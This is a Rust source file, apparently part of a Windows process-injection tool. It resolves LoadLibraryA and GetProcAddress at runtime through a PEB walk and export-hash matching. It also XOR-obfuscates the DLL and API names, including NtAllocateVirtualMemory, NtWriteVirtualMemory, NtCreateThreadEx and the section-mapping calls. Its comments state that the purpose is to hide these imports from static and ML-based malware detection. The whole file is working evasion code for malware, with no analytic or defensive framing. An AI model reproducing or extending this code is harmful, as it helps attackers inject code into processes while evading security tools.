// dynload.rs
// Dynamic API resolution with compile-time XOR-obfuscated function/DLL names.
//
// LoadLibraryA and GetProcAddress are NOT imported from the windows crate —
// they are resolved at runtime via PEB walk + export table hash matching.
// This removes the only kernel32 imports that would otherwise appear in the
// IAT (a strong static-ML malware indicator).

use std::ffi::c_void;
use std::sync::atomic::{AtomicPtr, Ordering};

use crate::peb_walk::find_kernel32;
use crate::api_hash::{
    get_proc_by_hash, FnLoadLibraryA, FnGetProcAddress,
    HASH_LOAD_LIBRARY_A, HASH_GET_PROC_ADDRESS,
};
use crate::target_select::PROCESSENTRY32;

// ── Function pointer type aliases ─────────────────────────────────────────────
// Only the subset actually called by dynamic_inject is declared here.  Unused
// primitives (VirtualAllocEx/CreateRemoteThread/CreateProcessW/etc.) were
// dropped so their XOR-encoded name arrays no longer occupy .rdata.

pub type FnOpenProcess          = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
pub type FnCloseHandle          = unsafe extern "system" fn(*mut c_void) -> i32;
pub type FnSnapshot             = unsafe extern "system" fn(u32, u32) -> *mut c_void;
pub type FnProcess32First       = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32) -> i32;
pub type FnProcess32Next        = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32) -> i32;
pub type FnPidToSessionId       = unsafe extern "system" fn(u32, *mut u32) -> i32;
pub type FnIsWow64Process       = unsafe extern "system" fn(*mut c_void, *mut i32) -> i32;
pub type FnGetCurrentProcessId  = unsafe extern "system" fn() -> u32;

// ── XOR decode (KEY = 0x5A) ───────────────────────────────────────────────────

const KEY: u8 = 0x5A;

fn decode(enc: &[u8]) -> Vec<u8> {
    let mut v: Vec<u8> = enc.iter().map(|b| b ^ KEY).collect();
    v.push(0);
    v
}

// ── Bootstrap: resolve LoadLibraryA + GetProcAddress without touching the IAT ─
// These are resolved once via PEB walk + export hash lookup, then cached.

static LOAD_LIBRARY_A:   AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static GET_PROC_ADDRESS: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

unsafe fn bootstrap() -> Option<(FnLoadLibraryA, FnGetProcAddress)> {
    let cached_ll = LOAD_LIBRARY_A.load(Ordering::Acquire);
    let cached_gp = GET_PROC_ADDRESS.load(Ordering::Acquire);
    if !cached_ll.is_null() && !cached_gp.is_null() {
        return Some((
            std::mem::transmute::<*mut c_void, FnLoadLibraryA>(cached_ll),
            std::mem::transmute::<*mut c_void, FnGetProcAddress>(cached_gp),
        ));
    }

    let k32 = find_kernel32();
    if k32.is_null() { return None; }

    let ll = get_proc_by_hash(k32, HASH_LOAD_LIBRARY_A);
    let gp = get_proc_by_hash(k32, HASH_GET_PROC_ADDRESS);
    if ll.is_null() || gp.is_null() { return None; }

    LOAD_LIBRARY_A.store(ll as *mut c_void, Ordering::Release);
    GET_PROC_ADDRESS.store(gp as *mut c_void, Ordering::Release);

    Some((
        std::mem::transmute::<*mut u8, FnLoadLibraryA>(ll),
        std::mem::transmute::<*mut u8, FnGetProcAddress>(gp),
    ))
}

unsafe fn resolve<T>(dll_enc: &[u8], name_enc: &[u8]) -> Option<T> {
    let (load_library_a, get_proc_address) = bootstrap()?;
    let dll  = decode(dll_enc);
    let name = decode(name_enc);
    let hmod = load_library_a(dll.as_ptr());
    if hmod.is_null() { return None; }
    let proc = get_proc_address(hmod, name.as_ptr());
    if proc.is_null() { return None; }
    Some(std::mem::transmute_copy(&proc))
}

// ── Encoded names (KEY = 0x5A) ────────────────────────────────────────────────

const K32:   &[u8] = &[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36]; // kernel32.dll
const NTDLL: &[u8] = &[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36];               // ntdll.dll

pub const N_NT_ALLOC:   &[u8] = &[0x14,0x2E,0x1B,0x36,0x36,0x35,0x39,0x3B,0x2E,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23]; // NtAllocateVirtualMemory
pub const N_NT_WRITE:   &[u8] = &[0x14,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23];                 // NtWriteVirtualMemory
pub const N_NT_PROTECT: &[u8] = &[0x14,0x2E,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23];       // NtProtectVirtualMemory
pub const N_NT_THREAD:  &[u8] = &[0x14,0x2E,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x1F,0x22];                                     // NtCreateThreadEx
pub const N_NT_CREATE_SECTION: &[u8] = &[0x14,0x2e,0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x09,0x3f,0x39,0x2e,0x33,0x35,0x34];                                   // NtCreateSection
pub const N_NT_MAP_VIEW:       &[u8] = &[0x14,0x2e,0x17,0x3b,0x2a,0x0c,0x33,0x3f,0x2d,0x15,0x3c,0x09,0x3f,0x39,0x2e,0x33,0x35,0x34];                   // NtMapViewOfSection
pub const N_NT_UNMAP_VIEW:     &[u8] = &[0x14,0x2e,0x0f,0x34,0x37,0x3b,0x2a,0x0c,0x33,0x3f,0x2d,0x15,0x3c,0x09,0x3f,0x39,0x2e,0x33,0x35,0x34];       // NtUnmapViewOfSection

const N_OPEN_PROCESS:             &[u8] = &[0x15,0x2A,0x3F,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29];
const N_CLOSE_HANDLE:             &[u8] = &[0x19,0x36,0x35,0x29,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F];
const N_CREATE_TOOLHELP32_SNAP:   &[u8] = &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0E,0x35,0x35,0x36,0x32,0x3F,0x36,0x2A,0x69,0x68,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E];
const N_PROCESS32_FIRST:          &[u8] = &[0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x69,0x68,0x1C,0x33,0x28,0x29,0x2E];
const N_PROCESS32_NEXT:           &[u8] = &[0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x69,0x68,0x14,0x3F,0x22,0x2E];
// ProcessIdToSessionId
const N_PID_TO_SESSION:           &[u8] = &[0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x13,0x3E,0x0E,0x35,0x09,0x3F,0x29,0x29,0x33,0x35,0x34,0x13,0x3E];
// IsWow64Process
const N_IS_WOW64:                 &[u8] = &[0x13,0x29,0x0D,0x35,0x2D,0x6C,0x6E,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29];
// GetCurrentProcessId
const N_GET_CURRENT_PID:          &[u8] = &[0x1D,0x3F,0x2E,0x19,0x2F,0x28,0x28,0x3F,0x34,0x2E,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x13,0x3E];

// ── Public resolver functions ─────────────────────────────────────────────────

pub unsafe fn open_process()            -> Option<FnOpenProcess>          { resolve(K32, N_OPEN_PROCESS) }
pub unsafe fn close_handle()            -> Option<FnCloseHandle>          { resolve(K32, N_CLOSE_HANDLE) }
pub unsafe fn toolhelp32_snapshot()     -> Option<FnSnapshot>             { resolve(K32, N_CREATE_TOOLHELP32_SNAP) }
pub unsafe fn process32_first()         -> Option<FnProcess32First>       { resolve(K32, N_PROCESS32_FIRST) }
pub unsafe fn process32_next()          -> Option<FnProcess32Next>        { resolve(K32, N_PROCESS32_NEXT) }
pub unsafe fn pid_to_session_id()       -> Option<FnPidToSessionId>       { resolve(K32, N_PID_TO_SESSION) }
pub unsafe fn is_wow64_process()        -> Option<FnIsWow64Process>       { resolve(K32, N_IS_WOW64) }
pub unsafe fn get_current_process_id()  -> Option<FnGetCurrentProcessId>  { resolve(K32, N_GET_CURRENT_PID) }

pub unsafe fn nt_raw(name_enc: &[u8]) -> Option<*const std::ffi::c_void> {
    let (load_library_a, get_proc_address) = bootstrap()?;
    let dll  = decode(NTDLL);
    let name = decode(name_enc);
    let hmod = load_library_a(dll.as_ptr());
    if hmod.is_null() { return None; }
    let proc = get_proc_address(hmod, name.as_ptr());
    if proc.is_null() { return None; }
    Some(proc as *const std::ffi::c_void)
}
